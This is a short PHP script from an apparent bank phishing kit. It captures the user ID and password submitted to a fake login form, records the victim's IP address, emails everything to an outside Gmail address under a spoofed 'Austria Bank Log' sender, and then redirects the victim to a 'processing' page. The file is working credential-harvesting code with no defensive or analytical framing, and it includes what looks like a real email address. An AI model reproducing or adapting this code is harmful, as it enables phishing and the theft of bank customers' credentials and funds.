<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "User ID: ".$_POST['LoginPortletFormID']."\n";
$msg .= "Password: ".$_POST['LoginPortletFormPassword']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By MMM----------------\n";
$post = "danielmorgan058@gmail.com";
$subj = "$ip - ".$_POST['id']."\n";
$from = "From: Austria Bank Log<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: Proccessing.html");	  

?>            